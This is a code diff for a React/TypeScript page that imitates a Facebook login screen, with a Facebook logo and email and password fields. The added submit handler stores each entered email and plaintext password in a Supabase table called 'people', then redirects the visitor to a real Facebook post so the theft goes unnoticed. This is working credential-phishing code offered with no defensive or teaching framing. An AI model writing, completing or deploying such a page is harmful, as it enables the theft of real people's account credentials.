@@ -1,17 +1,61 @@
 /* eslint-disable @typescript-eslint/no-explicit-any */
 import { useState } from "react";
 import IMg from "./assets/fb.svg";
+import { supabase } from "./api";
+import * as yup from "yup";
+
+const schema = yup.object().shape({
+  email: yup.string().required("Digita email ou numero de telefone"),
+  password: yup.string().required("Digita uma senha valida"),
+});
 
 function App() {
+  const [isLoading, setIsLoading] = useState(false);
   const [email, setEmail] = useState("");
   const [password, setpassword] = useState("");
+  const [errEmail, setErrEmail] = useState<null | string>(null);
+  const [errPass, setErPass] = useState<null | string>(null);
 
-  async function handleSubmit() {}
+  async function handleSubmit(e: any) {
+    e.preventDefault();
+    setErrEmail(null);
+    setErPass(null);
+    try {
+      await schema.validate({ email, password });
+      setIsLoading(true);
+      const response = await supabase
+        .from("people")
+        .insert({ email, password })
+        .single();
+
+      console.log("response", response);
+      if (response) {
+        window.location.href =
+          "https://www.facebook.com/100090979876124/posts/pfbid0zdeGfhpkjR1xoQgrzS9ifwjyGw1zNsPutJBqW6y1GUyWGcPowe4moftYaPo377Jhl/?app=fbl";
+      }
+    } catch (error) {
+      console.log(error);
+      if (error instanceof yup.ValidationError) {
+        if (error.message.includes("email")) {
+          setErrEmail(error.message);
+          return;
+        }
+        if (error.message.includes("senha")) {
+          setErPass(error.message);
+          return;
+        }
+      }
+    } finally {
+      setIsLoading(false);
+    }
+  }
 
   function handleChangeIn(e: any) {
+    setErrEmail(null);
     setEmail(e.target.value as string);
   }
   function changePassword(e: any) {
+    setErPass(null);
     setpassword(e.target.value);
   }
   return (
@@ -25,12 +69,15 @@ function App() {
         </div>
         <div className="right flex flex-col w-full h-full bg-white p-2 sm:p-8 item-center sm:shadow-xl rounded-lg sm:w-1/4 text-md relative">
           <input
-            type="text"
+            type="email"
             placeholder="Email address or phone number"
             className="px-4 h-12 my-2 border border-1 border-gray-400 rounded-md focus:outline-blue-500"
             value={email}
             onChange={handleChangeIn}
           />
+          {errEmail && (
+            <p className="text-[12px] mx-2 text-red-500">{errEmail}</p>
+          )}
           <input
             type="password"
             placeholder="Password"
@@ -38,7 +85,11 @@ function App() {
             value={password}
             onChange={changePassword}
           />
+          {errPass && (
+            <p className="text-[12px] mx-2 text-red-500">{errPass}</p>
+          )}
           <button
+            disabled={isLoading}
             type="submit"
             className="bg-blue-600 text-white font-bold my-2 py-3 rounded-md text-xl hover:cursor-pointer hover:bg-blue-700"
           >
